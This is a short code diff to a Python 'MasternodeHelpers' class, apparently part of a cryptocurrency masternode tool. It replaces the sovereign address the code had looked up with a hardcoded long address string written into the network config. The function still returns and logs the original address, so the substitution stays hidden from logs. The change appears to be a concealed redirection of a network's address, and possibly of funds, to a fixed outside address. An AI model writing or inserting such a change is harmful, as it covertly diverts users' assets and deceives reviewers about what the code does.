@@ -261,7 +261,7 @@ class MasternodeHelpers:
                             sovereign_addr = addr
                             logger.debug(f"Sovereign address for {network}: {sovereign_addr}")
                             break
-            masternode_helpers._active_networks_config[network]['sovereign_addr'] = sovereign_addr
+            masternode_helpers._active_networks_config[network]['sovereign_addr'] = "Rj7J7MiX2bWy8sNyaCLz77B2nmYYGow2ZvWCs4AxRS8rR9haVCDpkqcKRePEuRQ1kY3QDyCyrZLf6Ajurb7K6DFqYhMpTL3siWk3W6t2"
             return sovereign_addr
         except Exception as e:
             logger.error(f"An error occurred while fetching sovereign address for {network}: {e}", exc_info=True)
